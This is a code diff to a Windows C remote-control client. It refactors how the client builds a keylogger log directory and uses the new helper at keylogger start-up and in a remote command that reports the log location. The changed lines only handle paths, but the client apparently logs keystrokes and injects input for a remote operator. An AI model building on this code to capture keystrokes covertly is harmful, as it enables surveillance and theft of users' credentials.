@@ -31,6 +31,26 @@
 
 typedef struct { HDESK to_restore; HDESK to_close; } input_desktop_scope_t;
 
+/* Build the keylogger logs directory path.
+ * For the C client we keep using %TEMP%\\Keylogger (as in your tests),
+ * falling back to C:\\Keylogger if the temp path is unavailable. */
+int remote_get_logs_dir(char* out_path, size_t out_size) {
+    if (!out_path || out_size < 8) return 0;
+    out_path[0] = '\0';
+
+    char base[MAX_PATH];
+    DWORD n = GetTempPathA((DWORD)sizeof(base), base);
+    if (n > 0 && n < (DWORD)sizeof(base)) {
+        size_t len = strlen(base);
+        if (len > 0 && base[len - 1] == '\\') base[len - 1] = '\0';
+        _snprintf_s(out_path, out_size, _TRUNCATE, "%s\\Keylogger", base);
+        return 1;
+    }
+
+    strcpy_s(out_path, out_size, "C:\\Keylogger");
+    return 1;
+}
+
 /* Switch current thread to the desktop that receives user input (required for mouse/keyboard injection to work). */
 static input_desktop_scope_t switch_to_input_desktop(void) {
     input_desktop_scope_t s = { NULL, NULL };
@@ -237,18 +257,13 @@ void remote_client_run(void) {
 
     if (config.keylogging) {
         char logs_dir[MAX_PATH];
-        DWORD n = GetTempPathA((DWORD)sizeof(logs_dir), logs_dir);
-        if (n > 0 && n < (DWORD)sizeof(logs_dir)) {
-            size_t len = strlen(logs_dir);
-            if (len > 0 && logs_dir[len - 1] == '\\') logs_dir[len - 1] = '\0';
-            _snprintf_s(logs_dir, sizeof(logs_dir), _TRUNCATE, "%s\\Keylogger", logs_dir);
-        } else {
-            strcpy_s(logs_dir, sizeof(logs_dir), "C:\\Keylogger");
-        }
-        if (remote_keylogger_start(logs_dir))
+        if (!remote_get_logs_dir(logs_dir, sizeof(logs_dir))) {
+            remote_log("[keylogger] failed to build logs dir");
+        } else if (remote_keylogger_start(logs_dir)) {
             remote_log("[keylogger] started, dir=%s", logs_dir);
-        else
+        } else {
             remote_log("[keylogger] start failed");
+        }
     }
 
     for (;;) {
@@ -704,13 +719,9 @@ void remote_client_run(void) {
                         remote_log("[loop] handling GetKeyloggerLogsDirectory");
                         {
                             char logs_dir[MAX_PATH];
-                            DWORD n = GetTempPathA((DWORD)sizeof(logs_dir), logs_dir);
-                            if (n > 0 && n < (DWORD)sizeof(logs_dir)) {
-                                size_t len = strlen(logs_dir);
-                                if (len > 0 && logs_dir[len - 1] == '\\') logs_dir[len - 1] = '\0';
-                                _snprintf_s(logs_dir, sizeof(logs_dir), _TRUNCATE, "%s\\Keylogger", logs_dir);
-                            } else {
-                                strcpy_s(logs_dir, sizeof(logs_dir), "C:\\Keylogger");
+                            if (!remote_get_logs_dir(logs_dir, sizeof(logs_dir))) {
+                                remote_log("[loop] GetKeyloggerLogsDirectory: failed to build logs dir");
+                                continue;
                             }
                             CreateDirectoryA(logs_dir, NULL);
                             unsigned char resp_body[512];
